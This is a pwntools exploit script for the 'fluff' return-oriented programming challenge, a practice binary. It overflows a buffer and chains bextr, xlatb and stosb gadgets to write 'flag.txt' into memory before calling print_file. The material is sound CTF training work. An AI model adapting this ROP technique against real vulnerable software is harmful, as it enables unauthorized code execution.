from pwn import *

p = process('./fluff')

gdb.attach(p, gdbscript="""
b *0x0040062a #bextr
b *0x400510       # Breakpoint at print_file
c
""")

junk = b'A'*40

print_file = p64(0x00400510)
bss_addr = 0x00601038

pop_rdi = p64(0x00000000004006a3) # pop rdi ; ret
xlat = p64(0x0000000000400628) # xlatb ; ret
stosb = p64(0x0000000000400639) # stosb byte ptr [rdi], al ; ret
pop_rdx_rcx_bextr = p64(0x0040062a) #rcx + 0x3ef2

offset = 0x3ef2

char_addrs = {
    'f': p64(0x004006a6),
    'l': p64(0x00400405),
    'a': p64(0x004005d2),
    'g': p64(0x004007a0),
    '.': p64(0x004006a7),
    't': p64(0x004006ce),
    'x': p64(0x004007bc)
}

flag_txt = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']

rdx_val = 0x4000  # start=0, length=64 so essentiall mov rcx, rbx
al = 0xb #initial al

payload = junk

payload+=pop_rdi
payload+=p64(bss_addr)

for c in flag_txt:
    addr = u64(char_addrs[c]) # we need it to be a number to do math with it
    rbx_val = addr - al

    payload+=pop_rdx_rcx_bextr
    payload+=p64(rdx_val)
    payload+= p64(rbx_val - offset)
    payload+=xlat
    payload+=stosb

    al = ord(c)

payload+=pop_rdi
payload+=p64(bss_addr)
payload+=print_file

p.sendline(payload)
p.interactive()

